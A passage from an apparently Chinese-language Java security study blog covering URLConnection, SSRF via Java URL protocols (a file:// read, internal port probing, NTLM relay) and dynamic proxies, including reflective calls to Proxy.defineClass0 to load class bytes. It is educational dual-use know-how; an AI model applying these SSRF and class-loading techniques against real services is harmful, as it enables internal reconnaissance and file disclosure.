     <span class="comment">//逐行读取BufferedReader对象接收的内容到line中</span></span><br><span class="line">        <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            content.append(<span class="string">&quot;\n&quot;</span>).append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230710171051318.png" alt="image-20230710171051318" style="zoom:80%;" />

<p>大概描述一下这个过程，首先使用URL建立一个对象，调用<code>url</code>对象中的<code>openConnection</code>来获取一个<code>URLConnection</code>的实例，然后通过在<code>URLConnection</code>设置各种请求参数以及一些配置，在使用其中的<code>connect</code>方法来发起请求，然后在调用<code>getInputStream</code>来获请求的响应流。 这是一个基本的请求到响应的过程。</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>我们之前提到，由于URL类支持7种协议，因此在传入参数可控且没有做限制的情况下，很容易引发SSRF漏洞</p>
<p>例如，传入url参数为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///D:/test.txt&quot;</span>);</span><br><span class="line"><span class="type">URLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line">connection.connect();</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230710171518318.png" alt="image-20230710171518318" style="zoom:80%;" />

<p>但是如果上述代码中将<code>url.openConnection()</code>返回的对象强转为<code>HttpURLConnection</code>，则会抛出如下异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: sun.net.www.protocol.file.FileURLConnection cannot be cast to java.net.HttpURLConnection</span><br></pre></td></tr></table></figure>

<p>由此看来，ssrf漏洞也对使用不同类发起的url请求也是有所区别的，如果是<code>URLConnection|URL</code>发起的请求，那么对于上文中所提到的所有<code>protocol</code>都支持，但是如果经过二次包装或者其他的一些类发出的请求，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HttpURLConnection</span><br><span class="line">HttpClient</span><br><span class="line">Request</span><br><span class="line">okhttp</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>那么只支持发起<code>http|https</code>协议，否则会抛出异常。</p>
<p>如果传入的是<code>http://127.0.0.1:80</code>，且<code>127.0.0.1</code>的<code>80</code>端口存在的，则会将其网页源码输出出来</p>
<p><img src="/image/image-20230710171851532.png" alt="image-20230710171851532"></p>
<p>但如果是非web端口的服务，则会爆出<code>Invalid Http response</code> 或<code>Connection reset</code>异常。如果能将此异常抛出来，那么就可以对内网所有服务端口进行探测。</p>
<p>java中默认对(http|https)做了一些事情，比如:</p>
<ul>
<li>默认启用了透明NTLM认证</li>
<li>默认跟随跳转</li>
</ul>
<p>关于NTLM认证的过程这边不在复述，大家可以看该文章<a href="https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/">《Ghidra 从 XXE 到 RCE》</a> 默认跟随跳转这其中有一个坑点，就是</p>
<p><img src="/image/follow_redirect.jpg" alt="img"></p>
<p>它会对跟随跳转的url进行协议判断，所以Java的SSRF漏洞利用方式整体比较有限。</p>
<ul>
<li>利用file协议读取文件内容（仅限使用<code>URLConnection|URL</code>发起的请求）</li>
<li>利用http 进行内网web服务端口探测</li>
<li>利用http 进行内网非web服务端口探测(如果将异常抛出来的情况下)</li>
<li>利用http进行ntlmrelay攻击(仅限<code>HttpURLConnection</code>或者二次包装<code>HttpURLConnection</code>并未复写<code>AuthenticationInfo</code>方法的对象)</li>
</ul>
<p>对于防御ssrf漏洞的攻击，不单单要对传入的协议进行判断过滤，也要对其中访问的地址进行限制过滤。</p>
<h2 id="JNI安全基础（暂时跳过）"><a href="#JNI安全基础（暂时跳过）" class="headerlink" title="JNI安全基础（暂时跳过）"></a>JNI安全基础（暂时跳过）</h2><h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><p><code>Java</code>反射提供了一种类动态代理机制，可以通过代理接口实现类来完成程序无侵入式扩展。</p>
<p><strong>Java动态代理主要使用场景：</strong></p>
<ol>
<li>统计方法执行所耗时间。</li>
<li>在方法执行前后添加日志。</li>
<li>检测方法的参数或返回值。</li>
<li>方法访问权限控制。</li>
<li>方法<code>Mock</code>测试。</li>
</ol>
<h3 id="动态代理API"><a href="#动态代理API" class="headerlink" title="动态代理API"></a>动态代理API</h3><p>创建动态代理类会使用到<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。<code>java.lang.reflect.Proxy</code>主要用于生成动态代理类<code>Class</code>、创建代理类实例，该类实现了<code>java.io.Serializable</code>接口。</p>
<p><strong>java.lang.reflect.Proxy类主要有下面几种方法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取动态代理处理类对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy 返回调用处理程序的代理实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 代理实例的调用处理程序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title function_">getInvocationHandler</span><span class="params">(Object proxy)</span></span><br><span class="line">            <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     指定动态代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> h          动态代理处理类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回动态代理生成的代理类实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="line">            <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建动态代理类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader     定义代理类的类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces 代理类要实现的接口列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检测某个类是否是动态代理类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cl 要测试的类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isProxyClass</span><span class="params">(Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 向指定的类加载器中定义一个类对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader 类加载器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name   类名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b      类字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> off    截取开始位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> len    截取长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JVM创建的类Class对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class <span class="title function_">defineClass0</span><span class="params">(ClassLoader loader, String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>java.lang.reflect.InvocationHandler</code>接口用于调用<code>Proxy</code>类生成的代理类方法，该类只有一个<code>invoke</code>方法。</p>
<img src="/image/image-20230714003929831.png" alt="image-20230714003929831" style="zoom:80%;" />

<img src="/image/image-20230714004034736.png" alt="image-20230714004034736" style="zoom:80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并</span></span><br><span class="line"><span class="comment"> * 将其指派到它的调用处理程序的 invoke 方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在代理实例上处理方法调用并返回结果。在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  在其上调用方法的代理实例</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 对应于在代理实例上调用的接口方法的 Method 实例。Method 对象的声明类将是在其中声明</span></span><br><span class="line"><span class="comment">     *               方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args   包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，</span></span><br><span class="line"><span class="comment">     *               则为 null。基本类型的参数被包装在适当基本包装器类（如 java.lang.Integer</span></span><br><span class="line"><span class="comment">     *               或 java.lang.Boolean）的实例中。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 从代理实例的方法调用返回的值。如果接口方法的声明返回类型是基本类型，</span></span><br><span class="line"><span class="comment">     * 则此方法返回的值一定是相应基本包装对象类的实例；否则，它一定是可分配到声明返回类型的类型。</span></span><br><span class="line"><span class="comment">     * 如果此方法返回的值为 null 并且接口方法的返回类型是基本类型，则代理实例上的方法调用将抛出</span></span><br><span class="line"><span class="comment">     * NullPointerException。否则，如果此方法返回的值与上述接口方法的声明返回类型不兼容，</span></span><br><span class="line"><span class="comment">     * 则代理实例上的方法调用将抛出 ClassCastException。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable 从代理实例上的方法调用抛出的异常。该异常的类型必须可以分配到在接口方法的</span></span><br><span class="line"><span class="comment">     *                   throws 子句中声明的任一异常类型或未经检查的异常类型 java.lang.RuntimeException 或</span></span><br><span class="line"><span class="comment">     *                   java.lang.Error。如果此方法抛出经过检查的异常，该异常不可分配到在接口方法的 throws 子句中</span></span><br><span class="line"><span class="comment">     *                   声明的任一异常类型，代理实例的方法调用将抛出包含此方法曾抛出的异常的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用java-lang-reflect-Proxy动态创建类对象"><a href="#使用java-lang-reflect-Proxy动态创建类对象" class="headerlink" title="使用java.lang.reflect.Proxy动态创建类对象"></a>使用java.lang.reflect.Proxy动态创建类对象</h3><p><code>ClassLoader</code>和<code>Unsafe</code>都有一个叫做<code>defineClassXXX</code>的<code>native</code>方法，我们可以通过调用这个<code>native</code>方法动态的向<code>JVM</code>创建一个类对象，而<code>java.lang.reflect.Proxy</code>类恰好也有这么一个<code>native</code>方法，所以我们也将可以通过调用<code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法实现动态创建类对象。</p>
<h4 id="ProxyDefineClassTest"><a href="#ProxyDefineClassTest" class="headerlink" title="ProxyDefineClassTest"></a>ProxyDefineClassTest</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.y5neko.sec.classloader.TestClassLoader.TEST_CLASS_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDefineClassTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Proxy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统的类加载器，可以根据具体情况换成一个存在的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射java.lang.reflect.Proxy类获取其中的defineClass0方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>, ClassLoader.class, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射调用java.lang.reflect.Proxy.defineClass0()方法，动态向JVM注册</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">helloWorldClass</span> <span class="operator">=</span> (Class) method.invoke(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;classLoader, TEST_CLASS_NAME, TEST_CLASS_BYTES, <span class="number">0</span>, TEST_CLASS_BYTES.length&#125;);</span><br><span class="line">        System.out.println(helloWorldClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714104037059.png" alt="image-20230714104037059" style="zoom:80%;" />

<h3 id="创建代理类实例"><a href="#创建代理类实例" class="headerlink" title="创建代理类实例"></a>创建代理类实例</h3><p>我们可以使用<code>Proxy.newProxyInstance</code>来创建动态代理类实例，或者使用<code>Proxy.getProxyClass()</code>获取代理类对象再反射的方式来创建，下面我们以<code>com.y5neko.sec.proxy.FileSystem</code>接口为例，演示如何创建其动态代理类实例。</p>
<h4 id="com-y5neko-sec-proxy-FileSystem"><a href="#com-y5neko-sec-proxy-FileSystem" class="headerlink" title="com.y5neko.sec.proxy.FileSystem"></a>com.y5neko.sec.proxy.FileSystem</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FileSystem</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    String[] list(File file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="com-y5neko-sec-proxy-UnixFileSystem"><a href="#com-y5neko-sec-proxy-UnixFileSystem" class="headerlink" title="com.y5neko.sec.proxy.UnixFileSystem"></a>com.y5neko.sec.proxy.UnixFileSystem</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnixFileSystem</span> <span class="keyword">implements</span> <span class="title class_">FileSystem</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* -- Disk usage -- */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">spaceTotal</span> <span class="operator">=</span> <span class="number">996</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] list(File file) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在执行[&quot;</span> + <span class="built_in">this</span>.getClass().getName() + <span class="string">&quot;]类的list方法，参数:[&quot;</span> + file + <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file.list();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="com-y5neko-sec-proxy-JDKInvocationHandler"><a href="#com-y5neko-sec-proxy-JDKInvocationHandler" class="headerlink" title="com.y5neko.sec.proxy.JDKInvocationHandler"></a>com.y5neko.sec.proxy.JDKInvocationHandler</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDKInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JDKInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 为了不影响测试Demo的输出结果，这里忽略掉toString方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;toString&quot;</span>.equals(method.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;即将调用[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法...&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;已完成[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法调用...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Proxy-newProxyInstance创建动态代理类实例"><a href="#Proxy-newProxyInstance创建动态代理类实例" class="headerlink" title="Proxy.newProxyInstance创建动态代理类实例"></a>Proxy.newProxyInstance创建动态代理类实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxyInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建UnixFileSystem类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用JDK动态代理生成FileSystem动态代理类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器为FileSystem类的加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;,<span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem)<span class="comment">// 动态代理处理类</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(proxyInstance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714230336690.png" alt="image-20230714230336690" style="zoom:80%;" />

<h4 id="Proxy-getProxyClass反射创建动态代理类实例"><a href="#Proxy-getProxyClass反射创建动态代理类实例" class="headerlink" title="Proxy.getProxyClass反射创建动态代理类实例"></a>Proxy.getProxyClass反射创建动态代理类实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestGetProxyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 创建UnixFileSystem类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnixFileSystem</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理处理类</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JDKInvocationHandler</span>(fileSystem);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过指定类加载器、类实现的接口数组生成一个动态代理类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">proxyClass</span> <span class="operator">=</span> Proxy.getProxyClass(</span><br><span class="line">                FileSystem.class.getClassLoader(),<span class="comment">// 指定动态代理类的类加载器</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;FileSystem.class&#125;<span class="comment">// 定义动态代理生成的类实现的接口</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反射获取Proxy类构造器并创建动态代理类实例</span></span><br><span class="line">        <span class="type">FileSystem</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (FileSystem) proxyClass.getConstructor(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;InvocationHandler.class&#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;handler&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(proxyInstance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230714230458364.png" alt="image-20230714230458364" style="zoom:80%;" />

<h3 id="动态代理添加方法调用日志示例"><a href="#动态代理添加方法调用日志示例" class="headerlink" title="动态代理添加方法调用日志示例"></a>动态代理添加方法调用日志示例</h3><p>假设我们有一个叫做<code>FileSystem</code>接口，<code>UnixFileSystem</code>类实现了<code>FileSystem</code>接口，我们可以使用<code>JDK动态代理</code>的方式给<code>FileSystem</code>的接口方法执行前后都添加日志输出。</p>
<h4 id="FileSystemProxyTest"><a href="#FileSystemProxyTest" class="headerlink" title="FileSystemProxyTest"></a>FileSystemProxyTest</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileSystemProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span 